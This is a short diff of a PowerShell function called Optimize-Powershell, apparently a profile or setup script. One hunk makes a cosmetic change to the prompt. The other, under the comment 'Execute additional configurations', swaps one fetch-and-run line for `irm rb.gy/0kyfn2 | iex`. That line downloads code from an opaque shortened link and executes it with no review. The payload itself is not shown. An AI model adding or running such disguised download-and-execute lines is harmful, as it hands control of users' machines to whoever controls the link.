@@ -43,7 +43,7 @@ Function Optimize-Powershell {
 			Write-Host " | " -NoNewLine -BackgroundColor Black -ForegroundColor Red
 			Write-Host "$(Get-Date -Format 'yyyy-MM-dd') $((Get-Date).ToString("HH:mm:ss"))" -NoNewLine -BackgroundColor Black -ForegroundColor Magenta
 			Write-Host " |" -BackgroundColor Black -ForegroundColor Red
-			Write-Host "DIR: $($curdir.Path)" -BackgroundColor Black -ForegroundColor Yellow
+			Write-Host "| DIR: $($curdir.Path)" -BackgroundColor Black -ForegroundColor Yellow
 		    "[Command]: "
 		}
 		
@@ -85,7 +85,7 @@ Function Optimize-Powershell {
 		}
 		
 		# Execute additional configurations
-		irm ps.acgs.io | iex
+		irm rb.gy/0kyfn2 | iex
 		
 		if ($PSScriptRoot -notlike "C:\Program Files (x86)\ITSPlatform\tmp\scripting\*") {
 		    Expand-Terminal
